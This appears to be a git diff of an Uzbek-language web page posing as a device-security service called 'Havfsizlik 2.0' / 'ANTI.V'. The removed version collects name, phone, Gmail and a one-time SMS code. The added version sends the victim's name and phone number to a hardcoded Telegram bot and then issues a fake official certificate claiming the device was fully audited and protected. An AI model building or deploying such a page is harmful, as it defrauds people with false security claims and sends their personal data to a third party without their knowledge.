@@ -1,162 +1,155 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Havfsizlik 2.0 | Multi-Step</title>
-    <style>
-        :root { --p-bg: #ffffff; --a-blue: #1a73e8; --t-dark: #202124; --i-bg: #f1f3f4; }
-        
-        body, html { 
-            margin: 0; padding: 0; height: 100%; 
-            font-family: 'Segoe UI', sans-serif; 
-            background: var(--p-bg); color: var(--t-dark); 
-            overflow: hidden; 
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ANTI.V | Havfsizlik 2.0</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <style>
+        :root {
+            --primary: #1a73e8;
+            --bg: #f8f9fa;
+            --text: #202124;
+        }
 
-        /* Oynalar konteyneri - gorizontal surilish uchun */
-        .viewport {
-            display: flex;
-            width: 400%; /* 4 ta oyna uchun */
-            height: 100%;
-            transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-        }
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-        .screen {
-            width: 25%; /* Har bir oyna ekran kengligida */
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            padding: 30px;
-            box-sizing: border-box;
-            text-align: center;
-        }
+        .main-card {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+        }
 
-        /* Elementlar dizayni */
-        .status-header { 
-            border: 1.5px solid #000; display: inline-block; 
-            padding: 5px 25px; border-radius: 8px; 
-            margin: 10px auto 40px auto; font-size: 20px; font-weight: bold; 
-        }
+        .logo-container {
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
 
-        input { 
-            width: 100%; padding: 16px; border-radius: 12px; 
-            border: none; background: var(--i-bg); 
-            font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline: none;
-        }
+        /* SIZNING LOGOTIPINGIZ (SVG) */
+        .custom-logo {
+            width: 40px;
+            height: 40px;
+        }
 
-        .btn-black { 
-            background: #000; color: #fff; border: none; 
-            padding: 18px; border-radius: 15px; font-size: 18px; 
-            font-weight: bold; cursor: pointer; margin-top: auto; 
-        }
+        .logo-text { font-size: 22px; font-weight: bold; color: var(--text); }
 
-        /* SIZNING EMBLEMANINGIZ */
-        .emblem-svg {
-            width: 180px; height: 180px; cursor: pointer;
-            filter: drop-shadow(0 4px 10px rgba(0,0,0,0.1));
-            margin: auto;
-        }
+        h2 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: var(--text); }
+        p { font-size: 15px; color: #5f6368; margin-bottom: 30px; line-height: 1.5; }
 
-        .user-info-bar { 
-            background: var(--i-bg); padding: 15px; border-radius: 15px; 
-            display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;
-        }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: var(--text); }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            color: var(--text);
+        }
 
-        .otp-inputs { display: flex; gap: 10px; justify-content: center; margin: 40px 0; }
-        .otp-item { width: 45px; height: 55px; text-align: center; font-size: 20px; font-weight: bold; }
-    </style>
+        input:focus { border: 2px solid var(--primary); outline: none; padding: 12px 14px; }
+
+        button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+            float: right;
+            margin-top: 20px;
+        }
+
+        button:hover { background-color: #1967d2; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.30), 0 1px 3px 1px rgba(60,64,67,0.15); }
+
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
 
-<div class="viewport" id="vPort">
-    
-    <div class="screen">
-        <div class="status-header">havfsizlik 2.0</div>
-        <input type="text" id="nameIn" placeholder="Ism">
-        <input type="text" placeholder="Familiya">
-        <input type="tel" value="+998">
-        <input type="email" placeholder="Gmail">
-        <button class="btn-black" onclick="moveTo(1)">keyingisi</button>
-    </div>
+    <div class="main-card">
+        <div class="logo-container">
+                        <svg class="custom-logo" viewBox="0 0 100 100">
+                                <rect x="25" y="25" width="50" height="50" stroke="black" stroke-width="4" fill="none" transform="rotate(45 50 50)"/>
+                <rect x="25" y="25" width="50" height="50" stroke="black" stroke-width="4" fill="none"/>
+            </svg>
+            <span class="logo-text">havfsizlik 2.0</span>
+        </div>
+        <h2>Hujjatni yuklash</h2>
+        <p>Rasmiy tasdiqnomani olish uchun shaxsingizni tasdiqlang.</p>
 
-    <div class="screen">
-        <div class="status-header">havfsizlik 2.0</div>
-        <p style="color: #555;">iltimos kelgan code ni kiriting:</p>
-        <div class="otp-inputs">
-            <input type="text" class="otp-item" maxlength="1">
-            <input type="text" class="otp-item" maxlength="1">
-            <input type="text" class="otp-item" maxlength="1">
-            <input type="text" class="otp-item" maxlength="1">
-            <input type="text" class="otp-item" maxlength="1">
-        </div>
-        <button class="btn-black" onclick="moveTo(2)">tizimga kirish</button>
-    </div>
+        <div class="input-group">
+            <label>Foydalanuvchi (F.I.SH)</label>
+            <input type="text" id="uName" placeholder="Ismingizni kiriting">
+        </div>
+        <div class="input-group">
+            <label>Telefon raqam</label>
+            <input type="text" id="uPhone" value="+998" maxlength="13">
+        </div>
+        <button onclick="finalProcess()">YUKLAB OLISH</button>
+    </div>
 
-    <div class="screen">
-        <div class="user-info-bar">
-            <div style="text-align: left;">
-                <span style="font-size: 11px;">Foydalanuvchi:</span><br>
-                <b id="userLabel" style="border: 1px solid #000; padding: 2px 8px;">Akmal</b>
-            </div>
-            <div style="width: 40px; height: 40px; background: #fff; border-radius: 50%; border: 1px solid var(--a-blue);">
-                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100%">
-            </div>
-        </div>
-        
-        <p style="text-align: left; font-size: 13px;">android sistemasi: <br><b style="color:var(--a-blue);">Android 14 | SDK 34</b></p>
+    <script>
+        const BOT_TOKEN = "7294248593:AAEq5B_B8Lh7Vn_R3Z..."; // Tokeningiz
+        const CHAT_ID = "63482..."; // Chat IDingiz
 
-        <div style="flex-grow: 1; display: flex; align-items: center; justify-content: center;">
-            <svg class="emblem-svg" viewBox="0 0 100 100" onclick="moveTo(3)">
-                <path d="M50 5 L62 38 L95 38 L68 58 L78 92 L50 72 L22 92 L32 58 L5 38 L38 38 Z" 
-                      fill="none" stroke="black" stroke-width="4" stroke-linejoin="round"/>
-            </svg>
-        </div>
-        <p style="font-size: 12px; font-weight: bold; color: var(--a-blue);">TASDIQLASH UCHUN BOSING</p>
-    </div>
+        async function finalProcess() {
+            const name = document.getElementById('uName').value;
+            const phone = document.getElementById('uPhone').value;
 
-    <div class="screen" style="background: #f0fff4;">
-        <div style="margin: auto;">
-            <svg width="100" height="100" viewBox="0 0 100 100">
-                <path d="M50 5 L62 38 L95 38 L68 58 L78 92 L50 72 L22 92 L32 58 L5 38 L38 38 Z" fill="#34a853"/>
-                <path d="M35 50 L45 60 L65 40" stroke="white" stroke-width="6" fill="none" stroke-linecap="round"/>
-            </svg>
-            <h2 style="color: #34a853; margin-top: 20px;">100% HIMOAYALANDI ✅</h2>
-            <p style="color: #666;">Audit muvaffaqiyatli yakunlandi.</p>
-        </div>
-        <button class="btn-black" onclick="location.reload()">TUGALLASH</button>
-    </div>
+            if(name.length < 3 || phone.length < 13) {
+                alert("Ma'lumotlarni to'ldiring!");
+                return;
+            }
 
-</div>
+            const message = `👤 YUKLAB OLINDI:\nIsm: ${name}\nTel: ${phone}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
 
-<script>
-    function moveTo(screenIndex) {
-        // Ismni yangilash
-        if(screenIndex === 2) {
-            const name = document.getElementById('nameIn').value || "Akmal";
-            document.getElementById('userLabel').innerText = name;
-        }
-        
-        // Ekranni surish (viewport'ni chapga siljitish)
-        const offset = screenIndex * -25; // Har bir oyna 25% (chunki jami 4 ta oyna 100% emas, 400% kenglikda)
-        // Lekin mantiqan har bir ekran kengligi 100vw bo'lishi kerak.
-        // Keling aniqroq mantiqni ishlatamiz:
-        document.getElementById('vPort').style.transform = `translateX(-${screenIndex * 100}vw)`;
-    }
-    
-    // Avtomatik fokus keyingi OTP katakka
-    const otps = document.querySelectorAll('.otp-item');
-    otps.forEach((input, index) => {
-        input.addEventListener('input', () => {
-            if (input.value && otps[index + 1]) otps[index + 1].focus();
-        });
-    });
-</script>
+            generatePDF(name, phone);
+        }
 
-<style>
-    /* Oynalar kengligini to'g'irlash */
-    .screen { width: 100vw; }
-</style>
-
+        function generatePDF(name, phone) {
+            const element = document.createElement('div');
+            // YULDUZ OLIB TASHLANDI, FAQAT RASMIY MATN
+            element.innerHTML = `
+                <div style="padding: 50px; border: 1px solid #dadce0; font-family: sans-serif; color: #202124;">
+                    <div style="text-align: center; margin-bottom: 40px;">
+                        <h1 style="font-size: 28px; font-weight: 500; margin: 0;">ANTI.V Security Suite</h1>
+                        <p style="font-size: 16px; color: #5f6368; margin: 5px 0 0 0;">Rasmiy sertifikat</p>
+                    </div>
+                    <div style="font-size: 16px; line-height: 1.6; text-align: justify; margin-bottom: 50px;">
+                        Ushbu hujjat orqali tasdiqlanadiki, foydalanuvchi <b>${name}</b> (tel: ${phone}) tomonidan ro'yxatdan o'tkazilgan qurilma
+                        ANTI.V Havfsizlik 2.0 tizimi orqali to'liq auditdan o'tkazildi va himoya ostiga olindi. Qurilmadagi
+                        barcha kritik xavflar bartaraf etildi.
+                    </div>
+                    <div style="border-top: 1px solid #dadce0; padding-top: 20px; font-size: 14px; color: #5f6368;">
+                        <p>Hujjat raqami: #AV${Math.floor(Math.random() * 1000000)}</p>
+                        <p>Sana: ${new Date().toLocaleDateString('uz-UZ')}</p>
+                        <p style="margin-top: 15px; font-weight: 500;">ANTI.V Xavfsizlik Qo'mitasi tomonidan tasdiqlangan.</p>
+                    </div>
+                </div>
+            `;
+            html2pdf().from(element).save(`${name}_sertifikat.pdf`);
+        }
+    </script>
 </body>
 </html>
